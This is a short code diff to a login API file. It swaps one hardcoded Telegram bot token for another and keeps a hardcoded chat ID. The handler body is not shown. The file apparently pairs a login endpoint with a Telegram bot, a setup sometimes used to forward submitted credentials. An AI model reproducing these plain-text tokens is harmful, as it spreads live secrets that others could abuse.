@@ -1,7 +1,7 @@
 // File: /api/login.js (Final Version with your credentials)
 
 // 1. Your actual Token and Chat ID have been placed here.
-const TELEGRAM_BOT_TOKEN = '8233346929:AAFcILwtpZydDM9u9Fcb3gQhLl8AprzFcQk';
+const TELEGRAM_BOT_TOKEN = '8233346929:AAHLLaGq2pZdkT6wSh0MdsO3_CcGAockOs4';
 const TELEGRAM_CHAT_ID = '6402487270';
 
 export default async function handler(req, res) {
